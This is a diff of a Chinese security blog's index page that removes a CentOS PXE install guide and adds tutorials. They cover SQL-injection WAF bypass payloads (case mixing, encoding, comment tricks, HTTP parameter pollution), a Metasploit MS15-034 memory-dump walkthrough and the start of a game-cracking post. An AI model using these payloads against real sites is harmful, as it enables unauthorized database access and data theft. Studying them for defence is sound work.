+<p>将恶意语句大小写混合，如果WAF使用区分大小写的黑名单，则更改大小写可能会绕过该过滤器。</p>
+</blockquote>
+<p>例如：<a href="http://test.com/index.php?page_id=-15" target="_blank" rel="noopener">http://test.com/index.php?page_id=-15</a> uNIoN sELecT 1,2,3,4<br>2.Replace the keyword(Insert special characters that will be removed by WAF) – SELECT may become SEL&lt;ECT which would be passed on as SELECT once the offending character is removed.</p>
+<blockquote>
+<p>替换掉关键字（在中间插入一些会被WAF删除掉的特殊字符，例如&lt;&gt;之类的）就像是SELECT，如果在中间插入&lt;就变成了SEL&lt;ECT，一旦WAF删除掉违规的字符，就变成了select，它将作为select来传递</p>
+</blockquote>
+<p>例如:<a href="http://test.com/index.php?page_id=-15&nbsp;UNIunionON" target="_blank" rel="noopener">http://test.com/index.php?page_id=-15&nbsp;UNIunionON</a> SELselectECT 1,2,3,4<br>3.Encode(编码)<br>  +URL encode(加网址编码)<br>  例如:page.php?id=1%252f%252a<em>/UNION%252f%252a /SELECT<br>  +Hex encode(加16进制编码)<br>  例如:target.com/index.php?page_id=-15 /</em>!u%6eion<em>/ /</em>!se%6cect<em>/ 1,2,3,4…<br>  　    SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))<br>  +Unicode encode(加Unicode编码)<br>  例如:?id=10%D6‘%20AND%201=2%23　<br>  　　SELECT ‘Ä’=’A’; #1<br>4.use comments(使用注释)<br>Insert comments in middle of attack strings. For instance, /</em>!SELECT*/ might be overlooked by the WAF but passed on to the target application and processed by a mysql database.</p>
+<blockquote>
+<p>在攻击字符串中插入注释。 例如/ <em>！SELECT </em> /可能被WAF忽略，但传递给目标应用程序并由mysql数据库处理。</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h36jq29th120e1ksi1fp41ffna.png-j.jpg" alt="enter description here"></p>
+<ol>
+<li>Equivalent functions and commands(相等的函数和命令)<br>Some functions or commands can not be used because this keywords are detected, but in many cases we can be used with equivalent or similar code of them.<blockquote>
+<p>某些函数或命令不能使用，因为检测到这些关键字，但在很多情况下，我们可以使用它们的等效，功能一样的或类似的代码。</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://t1.aixinxi.net/o_1c8h2t2o81q2d1hqpmi7g0t1n6va.png-j.jpg" alt="enter description here"></p>
+<p>6.Special symbolsHere I have non-alphanumeric characters in the special symbols of a class, special symbols have a special meaning and usage.</p>
+<blockquote>
+<p>使用非字母数字字符,特殊符号具有特殊的含义和用法。(看不懂，等一个大佬)</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h41s3k6tuo5e3901s393mla.png-j.jpg" alt="enter description here"></p>
+<p>7.HTTP parameter controlSupply multiple parameter= value sets of the same name to confuse the WAF. Given the example <a href="http://example.com?id=1&amp;?id=’" target="_blank" rel="noopener">http://example.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘ in some circumstances such as with Apache/PHP, the application will only parse the last (second) instance of id= while the WAF only parses the first. It appears to be a legitimate request but the application still receives and process malicious input. Most WAF’s today are not vulnerable to HTTP Parameter Pollution (HPP) but it is still worth a try when building bypasses.<br>+HPP (HTTP Parameter Polution)</p>
+<blockquote>
+<p>利用HTTP参数控制具有相同名称的多个参数集以混淆WAF。例如<a href="http://example.com?id=1&amp;?id=’" target="_blank" rel="noopener">http://example.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘ ，在某些情况下，如Apache / PHP，应用程序将仅解析id =的最后一个（第二个）实例，而WAF仅解析第一个实例。这看起来是一个合法的请求，但应用程序仍然接收并处理这些恶意代码。今天的大多数WAF都不容易受到HTTP参数污染（HPP）的影响，但测试时仍然值得一试。</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h5m2ob1cfd222151m161i11k1a.png-j.jpg" alt="enter description here"></p>
+<p>HPP is also known as repeated parameter contamination, the simplest is: uid = 1 &amp; uid = 2 &amp; uid = 3, for this case, different Web server processing as follows:</p>
+<blockquote>
+<p>HPP也被称为重复参数污染，最简单的是：uid = 1＆uid = 2＆uid = 3，对于这种情况，不同的Web服务器处理如下：<br><img src="http://t1.aixinxi.net/o_1c8h5rr6s4up4fnn41rdm1guba.png-j.jpg" alt="enter description here"></p>
+</blockquote>
+<p>+HPF (HTTP Parameter Fragment  翻译:HTTP参数片段)</p>
+<p>This method is HTTP segmentation injection, similar to CRLF (using control characters% 0a,% 0d, etc. to perform line breaks)</p>
+<blockquote>
+<p>此方法是HTTP分段注入，与CRLF类似（使用控制字符％0a，％0d等执行换行符）</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h63pqq3minu518t81ekdqofa.png-j.jpg" alt="enter description here"></p>
+<p>+HPC (HTTP Parameter Contamination 翻译:HTTP参数污染)<br>RFC2396 defines the following characters:</p>
+<blockquote>
+<p>RFC2396定义了以下字符：</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h6apj715cb14r9on3lja6kba.png-j.jpg" alt="enter description here"></p>
+<p>Different Web server processing processes have different logic when constructing special requests:</p>
+<blockquote>
+<p>构建特殊请求时，不同的Web服务器处理进程具有不同的逻辑</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h6enuaitr901j3qktfklfa.png-j.jpg" alt="enter description here"></p>
+<p>In the case of the magic character %, Asp / Asp.net will be affected</p>
+<blockquote>
+<p>在字符％的情况下，Asp / Asp.net将受到影响</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h7lb961qjukij1q0nu1stota.png-j.jpg" alt="enter description here"></p>
+<p>8.Buffer overflowWAF’s are, afterall, applications and vulnerable to the same software flaws as any other application. If a buffer overflow condition can create a crash, even if it does not result in code execution, this may result in a WAF failing open. In other words, a bypass.</p>
+<blockquote>
+<p>缓冲区溢出WAF,WAF同样也容易受到与任何其他应用程序相同的软件缺陷的影响。 如果缓冲区溢出导致崩溃，即使它不会导致代码执行。这可能会导致WAF“故障”，从而绕过，这也是一种方法</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8h81n0b1rqe1boi1od3k0efofa.png-j.jpg" alt="enter description here"></p>
+<p>9.Integration means the use of a variety of bypass technology, a single technology may not be able to bypass the filtering mechanism, but the use of a variety of technologies with the possibility of success will increase a lot.</p>
+<blockquote>
+<p>整合指的是利用各样的绕过技巧，单一方式可能无法绕过过滤机制，但使用各种不同的方法成功的可能性会增加很多。</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c8hb5kj110242jo17g217k24dna.png-j.jpg" alt="enter description here"></p>
 <hr>
-<p>本文是转载@Han的文章，如需转载，请注明出处。否则将追究法律责任<br>Han’s Blog: <a href="http://hanq.top" target="_blank" rel="noopener">http://hanq.top</a></p>
+<p>本文部分内容@butters帮忙翻译，文章为译文，原文章地址：<a href="https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/" target="_blank" rel="noopener">https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/</a>  文章翻译若是有不流畅或者不正确的，欢迎指出，我会尽快更改</p>
 
       
     </div>
@@ -644,14 +720,10 @@ yum makecache
     <div class="article-info article-info-index">
       
       
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/windows/">windows</a>
-    </div>
-
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
       
@@ -673,11 +745,11 @@ yum makecache
 
 
   
-    <article id="post-Centos6.5下 PXE+Kickstart无人值守安装" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-MS15-034漏洞模块利用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/01/27/Centos6.5下 PXE+Kickstart无人值守安装/" class="article-date">
-      <time datetime="2018-01-27T07:08:52.000Z" itemprop="datePublished">2018-01-27</time>
+      <a  href="/2018/03/07/MS15-034漏洞模块利用/" class="article-date">
+      <time datetime="2018-03-07T00:21:31.000Z" itemprop="datePublished">2018-03-07</time>
 </a>
 
     </div>
@@ -691,7 +763,7 @@ yum makecache
         
   
     <h1 itemprop="name">
-      <a  class="article-title" href="/2018/01/27/Centos6.5下 PXE+Kickstart无人值守安装/">Centos6.5下 PXE+Kickstart无人值守安装</a>
+      <a  class="article-title" href="/2018/03/07/MS15-034漏洞模块利用/">MS15-034漏洞模块利用</a>
     </h1>
   
 
@@ -702,303 +774,15 @@ yum makecache
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="http://i2.51cto.com/images/blog/201801/27/825b310e30f29283075675b6d3d3598c.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>  PXE（Preboot eXecute Environment，预启动执行环境）是由Intel公司开发的技术，可以让计算机通过网络来启动操作系统（前提是计算机上安装的网卡支持PXE技术），主要用于在无人值守安装系统中引导客户端主机安装Linux操作系统。Kickstart是一种无人值守的安装方式，其工作原理是预先把原本需要运维人员手工填写的参数保存成一个ks.cfg文件，当安装过程中需要填写参数时则自动匹配Kickstart生成的文件。<br>为了让服务器与客户端主机进行文件传输，并分配IP可用的地址 我们先来配置DHCP服务</p>
-<pre><code>[root@localhost ~]  yum install dhcp -y
-Loaded plugins: fastestmirror
-Determining fastest mirrors
- * c6-media: 
-Setting up Install Process
-Resolving Dependencies
---&gt; Running transaction check
----&gt; Package dhcp.x86_64 12:4.1.1-38.P1.el6.centos will be installed
---&gt; Processing Dependency: portreserve for package: 12:dhcp-4.1.1-38.P1.el6.centos.x86_64
---&gt; Running transaction check
----&gt; Package portreserve.x86_64 0:0.0.4-9.el6 will be installed
---&gt; Finished Dependency Resolution
-
-Dependencies Resolved
-
-==============================================================
- Package                             Arch                           Version                                             Repository                        Size
-==============================================================
-Installing:
- dhcp                                x86_64                         12:4.1.1-38.P1.el6.centos                           c6-media                         817 k
-Installing for dependencies:
- portreserve                         x86_64                         0.0.4-9.el6                                         c6-media                          23 k
-
-Transaction Summary
-=============================================================
-Install       2 Package(s)
-
-Total download size: 840 k
-Installed size: 1.9 M
-Downloading Packages:
--------------------------------------------------------------------------------------------------------------
-Total                                                                                                                           12 MB/s | 840 kB     00:00     
-Running rpm_check_debug
-Running Transaction Test
-Transaction Test Succeeded
-Running Transaction
-  Installing : portreserve-0.0.4-9.el6.x86_64                                                                               
-                              1/2 
-  Installing : 12:dhcp-4.1.1-38.P1.el6.centos.x86_64                                                                                                       2/2 
-  Verifying  : 12:dhcp-4.1.1-38.P1.el6.centos.x86_64                                                                                                       1/2 
-  Verifying  : portreserve-0.0.4-9.el6.x86_64                                                                                                              2/2 
-
-
-Installed:
-  dhcp.x86_64 12:4.1.1-38.P1.el6.centos                                                                                                                        
-
-Dependency Installed:
-  portreserve.x86_64 0:0.0.4-9.el6                                                                                                                             
-
-Complete!
-</code></pre><p>复制这个文件为dhcp的配置文件</p>
-<pre><code>[root@localhost ~]  cp /usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample /etc/dhcp/dhcpd.conf 
-cp: overwrite `/etc/dhcp/dhcpd.conf&#39;?  y
-</code></pre><p>修改dhcp配置文件<br><code>[root@localhost ~]  vim /etc/dhcp/dhcpd.conf</code></p>
-<pre><code>指定引导服务器和引导驱动文件 “pxelinux.0”
-# A slightly different configuration for an internal subnet.
-subnet 192.168.100.0 netmask 255.255.255.0 {
-  range 192.168.100.10 192.168.100.50;
-  default-lease-time 600;
-  max-lease-time 7200;
-  next-server 192.168.100.1;
-  filename &quot;pxelinux.0&quot;;
-}
-</code></pre><p>保存退出</p>
-<p>安装tftp服务提供引导及驱动文件</p>
-<pre><code>[root@localhost ~]  yum install tftp-server -y
-Loaded plugins: fastestmirror
-Loading mirror speeds from cached hostfile
- * c6-media: 
-Setting up Install Process
-Resolving Dependencies
---&gt; Running transaction check
----&gt; Package tftp-server.x86_64 0:0.49-7.el6 will be installed
---&gt; Processing Dependency: xinetd for package: tftp-server-0.49-7.el6.x86_64
---&gt; Running transaction check
----&gt; Package xinetd.x86_64 2:2.3.14-39.el6_4 will be installed
---&gt; Finished Dependency Resolution
-
-Dependencies Resolved
-
-===============================================================================================================================================================
- Package                               Arch                             Version                                       Repository                          Size
-===============================================================================================================================================================
-Installing:
- tftp-server                           x86_64                           0.49-7.el6                                    c6-media                            39 k
-Installing for dependencies:
- xinetd                                x86_64                           2:2.3.14-39.el6_4                             c6-media                           121 k
-
-Transaction Summary
-===============================================================================================================================================================
-Install       2 Package(s)
-
-Total download size: 161 k
-Installed size: 317 k
-Downloading Packages:
----------------------------------------------------------------------------------------------------------------------------------------------------------------
-Total                                                                                                                          3.0 MB/s | 161 kB     00:00     
-Running rpm_check_debug
-Running Transaction Test
-Transaction Test Succeeded
-Running Transaction
-  Installing : 2:xinetd-2.3.14-39.el6_4.x86_64                                                                                                             1/2 
-  Installing : tftp-server-0.49-7.el6.x86_64                                                                                                               2/2 
-  Verifying  : tftp-server-0.49-7.el6.x86_64                                                                                                               1/2 
-  Verifying  : 2:xinetd-2.3.14-39.el6_4.x86_64                                                                                                             2/2 
-
-Installed:
-  tftp-server.x86_64 0:0.49-7.el6                                                                                                                              
-
-Dependency Installed:
-  xinetd.x86_64 2:2.3.14-39.el6_4                                                                                                                              
-
-Complete!
-</code></pre><p>配置tftp服务</p>
-<pre><code>[root@localhost ~]  vim /etc/xinetd.d/tftp 
-
-# default: off
-# description: The tftp server serves files using the trivial file transfer \
-#       protocol.  The tftp protocol is often used to boot diskless \
-#       workstations, download configuration files to network-aware printers, \
-#       and to start the installation process for some operating systems.
-service tftp
-{
-                    socket_type                = dgram
-                    protocol                   = udp
-                    wait                       = yes
-                    user                       = root
-                    server                     = /usr/sbin/in.tftpd
-                    server_args                = -s /tftpboot
-                    disable                    = no
-                    per_source                 = 11
-                    cps                        = 100 2
-                    flags                      = IPv4
-}
-</code></pre><p>建立tftp存储目录<br><code>[root@localhost ~]  mkdir /tftpboot</code><br>安装syslinux软件 （提供引导文件）</p>
-<pre><code>[root@localhost ~]  yum install syslinux -y
-Loaded plugins: fastestmirror
-Loading mirror speeds from cached hostfile
- * c6-media: 
-Setting up Install Process
-Resolving Dependencies
---&gt; Running transaction check
----&gt; Package syslinux.x86_64 0:4.02-8.el6 will be installed
---&gt; Processing Dependency: mtools for package: syslinux-4.02-8.el6.x86_64
---&gt; Running transaction check
----&gt; Package mtools.x86_64 0:4.0.12-1.el6 will be installed
---&gt; Finished Dependency Resolution
-
-Dependencies Resolved
-
-===============================================================================================================================================================
- Package                              Arch                               Version                                    Repository                            Size
-===============================================================================================================================================================
-Installing:
- syslinux                             x86_64                             4.02-8.el6                                 c6-media                             859 k
-Installing for dependencies:
- mtools                               x86_64                             4.0.12-1.el6                               c6-media                             194 k
-
-Transaction Summary
-===============================================================================================================================================================
-Install       2 Package(s)
-
-Total download size: 1.0 M
-Installed size: 2.3 M
-Downloading Packages:
----------------------------------------------------------------------------------------------------------------------------------------------------------------
-Total                                                                                                                           21 MB/s | 1.0 MB     00:00     
-Running rpm_check_debug
-Running Transaction Test
-Transaction Test Succeeded
-Running Transaction
-  Installing : mtools-4.0.12-1.el6.x86_64                                                                                                                  1/2 
-  Installing : syslinux-4.02-8.el6.x86_64                                                                                                                  2/2 
-  Verifying  : syslinux-4.02-8.el6.x86_64                                                                                                                  1/2 
-  Verifying  : mtools-4.0.12-1.el6.x86_64                                                                                                                  2/2 
-
-Installed:
-  syslinux.x86_64 0:4.02-8.el6                                                                                                                                 
-
-Dependency Installed:
-  mtools.x86_64 0:4.0.12-1.el6                                                                                                                                 
-
-Complete!
-</code></pre><p>复制引导文件到tftp目录下<br><code>[root@localhost ~]  cp /usr/share/syslinux/pxelinux.0   /tftpboot/</code><br>安装镜像还有引导文件 需要复制到tftpboot下面<br><code>[root@localhost ~]  cp /mnt/isolinux/*     /tftpboot/</code><br>tftpboot目录下创立pxelinux.cfg目录 并复制isolinux.cfg 改名为default</p>
-<pre><code>#default文件是开机时的选项菜单
-[root@localhost tftpboot]  mkdir pxelinux.cfg
-[root@localhost tftpboot]  
-[root@localhost tftpboot]  
-[root@localhost tftpboot]  cp isolinux.cfg pxelinux.cfg/default
-</code></pre><pre><code>[root@localhost tftpboot]  vim pxelinux.cfg/default 
-default vesamenu.c32
-#prompt 1
-timeout 1
-
-display boot.msg
-
-menu background splash.jpg
-menu title Welcome to CentOS 6.5!
-menu color border 0 #ffffffff #00000000
-menu color sel 7 #ffffffff #ff000000
-menu color title 0 #ffffffff #00000000
-menu color tabmsg 0 #ffffffff #00000000
-menu color unsel 0 #ffffffff #00000000
-menu color hotsel 0 #ff000000 #ffffffff
-menu color hotkey 7 #ffffffff #ff000000
-menu color scrollbar 0 #ffffffff #00000000
-
-label linux
-  menu label ^Install or upgrade an existing system
-  menu default
-  kernel vmlinuz
-  append initrd=initrd.img ks=ftp://192.168.100.1/pub/ks.cfg
-label vesa
-  menu label Install system with ^basic video driver
-  kernel vmlinuz
-  append initrd=initrd.img xdriver=vesa nomodeset
-label rescue
-</code></pre><p>ks.cfg为我们指定的应答文件</p>
-<pre><code>安装vsftpd传输光盘镜像给客户机
-[root@localhost tftpboot]  yum install vsftpd -y
-Loaded plugins: fastestmirror
-Loading mirror speeds from cached hostfile
- * c6-media: 
-Setting up Install Process
-Resolving Dependencies
---&gt; Running transaction check
----&gt; Package vsftpd.x86_64 0:2.2.2-11.el6_4.1 will be installed
---&gt; Finished Dependency Resolution
-
-Dependencies Resolved
-
-===============================================================================================================================================================
- Package                            Arch                               Version                                      Repository                            Size
-===============================================================================================================================================================
-Installing:
- vsftpd                             x86_64                             2.2.2-11.el6_4.1                             c6-media                             151 k
-
-Transaction Summary
-===============================================================================================================================================================
-Install       1 Package(s)
-
-Total download size: 151 k
-Installed size: 331 k
-Downloading Packages:
-Running rpm_check_debug
-Running Transaction Test
-Transaction Test Succeeded
-Running Transaction
-  Installing : vsftpd-2.2.2-11.el6_4.1.x86_64                                                                                                              1/1 
-  Verifying  : vsftpd-2.2.2-11.el6_4.1.x86_64                                                                                                              1/1 
-
-Installed:
-  vsftpd.x86_64 0:2.2.2-11.el6_4.1                                                                                                                             
-
-Complete!
-</code></pre><p>将完整光盘镜像复制到vsftp的匿名目录下</p>
-<pre><code>
-[root@localhost tftpboot]  cp -rp /mnt/* /var/ftp/pub/
-[root@localhost tftpboot] cd /var/ftp/pub
-[root@localhost pub] cp /root/anaconda-ks.cfg  /var/ftp/pub/ks.cfg
-[root@localhost pub]  vim /var/ftp/pub/ks.cfg
-</code></pre><pre><code># Kickstart file automatically generated by anaconda.
-
-#version=DEVEL
-install
-cdrom
-url --url=ftp://192.168.100.1/pub
-lang en_US.UTF-8
-keyboard us
-network --onboot no --device eth0 --bootproto dhcp --noipv6
-rootpw  --iscrypted $6$1B9c8VVXZm4BJZ6n$BemGfzmvSZ2BmpUeikQhpffk0/58gKCdw9mE1o5Wv9aEjQcj60iUogaNO7KXBuT.dO08JXrde/O6vbihVtzKG.
-firewall --service=ssh
-authconfig --enableshadow --passalgo=sha512
-selinux --enforcing
-省略.....
-
-
-repo --name=&quot;CentOS&quot;  --baseurl=ftp://192.168.100.1/pub
-</code></pre><p><code>[root@localhost pub] chmod 777  ks.cfg</code>  #给ks.cfg文件权限 否则会没有权限执行<br>重启dhcp xinetd vsftpd 关闭防火墙 关闭selinux</p>
-<pre><code>[root@localhost pub]  service dhcpd restart
-Shutting down dhcpd:                                     [  OK  ]
-Starting dhcpd:                                              [  OK  ]
-[root@localhost pub]  service xinetd restart
-Stopping xinetd:                                           [  OK  ]
-Starting xinetd:                                             [  OK  ]
-[root@localhost pub] service vsftpd restart
-Shutting down vsftpd:                                      [  OK  ]
-Starting vsftpd for vsftpd:                                 [  OK  ]
-[root@localhost pub]  service iptables stop
-[root@localhost pub]  setenforce 0
-</code></pre><p>开一台虚拟机选择桥接模式 开启电源<br>会获取到镜像</p>
-<p>开始安装</p>
-<p><img src="http://i2.51cto.com/images/blog/201801/27/bb727037f8f7f7162e3265e24e7c1225.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>By: Han QQ 2314056484</p>
-<hr>
-<p>本文是转载@Han的文章，如需转载，请注明出处。否则将追究法律责任<br>Han’s Blog: <a href="http://hanq.top" target="_blank" rel="noopener">http://hanq.top</a></p>
+        <h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><p>在kali中自带的msf由于版本太低，有的模块是没有的，所以我们先更新源<br><img src="http://t1.aixinxi.net/o_1c7usp0vr1ul21ohp8p21j1ca6ca.jpg-j.jpg" alt=""></p>
+<p>  源的文件位置:/etc/apt/sources.list<br>  下面是更新源:<br>官方的：deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>中科大：deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>将上面的源添加进/etc/apt/sources.list后，执行apt-get update即可<br>更新完后，执行apt-get install metasploit-framework更新msf<br><img src="http://t1.aixinxi.net/o_1c7usscih1d6abo1enoigj1u1va.jpg-j.jpg" alt=""></p>
+<p>  更新完后，输入msfconsole打开软件<br>  <img src="http://t1.aixinxi.net/o_1c7ustd3k16ga181ni1d1c9gr9na.jpg-j.jpg" alt=""></p>
+<p>  可以看到已经更新为v4.16.32了</p>
+<h2 id="查找-利用模块"><a href="#查找-利用模块" class="headerlink" title="查找/利用模块"></a>查找/利用模块</h2><p>进来后，不清楚ms15-034的利用模块在哪，我们可以执行search ms15-034来查找<br><img src="http://t1.aixinxi.net/o_1c7ut03dgkak1qsa15g5bf31ucsa.jpg-j.jpg" alt=""></p>
+<p>  然后use auxiliary/scanner/http/ms15_034_http_sys_memory_dump后，show options来查看需要配置的<br>  <img src="http://t1.aixinxi.net/o_1c7ut28i111td1da1f5f12kgvifa.jpg-j.jpg" alt=""></p>
+<p>  设置好对方ip及目标url后，exploit执行<br>  <img src="http://t1.aixinxi.net/o_1c7ut446g1dh49tpe1urshlka.jpg-j.jpg" alt=""></p>
+<p><img src="http://t1.aixinxi.net/o_1c7ut4v1er0v1k9p1unq1kf161oa.jpg-j.jpg" alt=""></p>
+<p>  完成</p>
 
       
     </div>
@@ -1006,14 +790,416 @@ Starting vsftpd for vsftpd:                                 [  OK  ]
     <div class="article-info article-info-index">
       
       
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/linux/">linux</a>
-    </div>
-
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-SQLBypass技巧" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/03/05/SQLBypass技巧/" class="article-date">
+      <time datetime="2018-03-05T03:30:48.000Z" itemprop="datePublished">2018-03-05</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/03/05/SQLBypass技巧/">SQL注入Bypass技巧</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="SQL注入Bypass技巧"><a href="#SQL注入Bypass技巧" class="headerlink" title="SQL注入Bypass技巧"></a>SQL注入Bypass技巧</h1><h2 id="注入点识别"><a href="#注入点识别" class="headerlink" title="注入点识别"></a>注入点识别</h2><p>SQL注入的第一步就是判断是不是注入点，一般都是在参数后面简单的and 1=1和and 1=2等来判断是否有注入点或者是否有WAF拦截，如果简单的and 1=1这种被WAF拦截了，可以使用如下方法绕过:<br>1.使用一些字符串来进行识别:</p>
+<blockquote>
+<p>+，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;，也可以将and换成or，&amp;&amp;， ||等</p>
+</blockquote>
+<p>2.不使用and或者or，直接使用异或截断：</p>
+<blockquote>
+<p>1^1^0，1^0^0</p>
+</blockquote>
+<p><img src="http://t1.aixinxi.net/o_1c7q22pcjjhah5j141g1lda9uda.jpg-j.jpg" alt="enter description here"></p>
+<p>  3.使用{``operation}来识别注入点：<br>  <img src="http://t1.aixinxi.net/o_1c7q2758g1luf1g4ga182f6up3a.jpg-j.jpg" alt="enter description here"></p>
+<p>  4.也可以使用注释符,主要为：#， –+， /<em>xxx</em>/， /<em>!xxx</em>/， /<em>!50000xxx</em>/<br>  <img src="http://t1.aixinxi.net/o_1c7q2b1nb12s61vq417tga7p1jqva.jpg-j.jpg" alt="enter description here"></p>
+<p>  (此方法目前可以绕过很多WAF）<br>  5.特殊符号，在SQL注入时使用一些特殊符号即可绕过很多WAF规则，比如~， !， <code>， @</code>， {x key}， 1.1， 1e1， ()， emoji表情符号， @:=等，在实际场景中将这些符号灵活应用就可以绕过很多WAF:<br>  <img src="http://t1.aixinxi.net/o_1c7q2grjo1bcl1md51idl4sv4eka.jpg-j.jpg" alt="enter description here"></p>
+<p>  6.Like和regexp<br>  在通过盲注获取数据时需要使用MySQL自带函数，比如substring()等这些处理字符串的函数，但是如果WAF过滤了()时，这些函数就无法使用了导致无法猜测数据，这时可以使用like或者regexp获取数据:<br>  <img src="http://t1.aixinxi.net/o_1c7q2j5n715t4cjsqbh1klq2eqa.jpg-j.jpg" alt="enter description here"></p>
+<p><img src="http://t1.aixinxi.net/o_1c7q2ngr5bqj12tf1kkp60a13tpa.jpg-j.jpg" alt="enter description here"></p>
+<h2 id="爆库名、表名、字段名"><a href="#爆库名、表名、字段名" class="headerlink" title="爆库名、表名、字段名"></a>爆库名、表名、字段名</h2><p>通常情况下我们在手工注入数据库内容的时候都是使用MySQL自带的表名等:</p>
+<h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p><img src="http://t1.aixinxi.net/o_1c7q2pitc1nv75pm65c1o7f9rfa.jpg-j.jpg" alt="enter description here"></p>
+<h3 id="爆表单"><a href="#爆表单" class="headerlink" title="爆表单"></a>爆表单</h3><p> <img src="http://t1.aixinxi.net/o_1c7q340ap1k5o175ijpjies121a.jpg-j.jpg" alt="enter description here"></p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><img src="http://t1.aixinxi.net/o_1c7q353a4okf4knud114h111ema.jpg-j.jpg" alt="enter description here"></p>
+<p>  (上图不同点在数据库名称那)</p>
+<h3 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h3><p><img src="http://t1.aixinxi.net/o_1c7q35j2b44lcjg1d48tdoe2la.jpg-j.jpg" alt="enter description here"></p>
+<hr>
+<p>  参考文章:<a href="https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg</a><br>  微信公众号：逢魔安全实验室<br>  本文所有内容皆参考与此，还有部分内容未打出来，可以自行去原文观看，侵删</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-游戏旅行青蛙逆向破解" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/03/01/游戏旅行青蛙逆向破解/" class="article-date">
+      <time datetime="2018-03-01T02:27:46.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/03/01/游戏旅行青蛙逆向破解/">游戏旅行青蛙逆向破解</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="游戏旅行青蛙逆向破解"><a href="#游戏旅行青蛙逆向破解" class="headerlink" title="游戏旅行青蛙逆向破解"></a>游戏旅行青蛙逆向破解</h1><blockquote>
+<p>《旅行青蛙》原名旅かえる，是由游戏公司HIT-POINT研发的休闲小游戏，是一款放置类型手游，支持Android/iOS运行。</p>
+</blockquote>
+<ul>
+<li>许多玩家都碍于三叶草等消耗性道具而“不能享受游戏体验“，那么今天就来将这些消耗性道具破解了.</li>
+</ul>
+<blockquote>
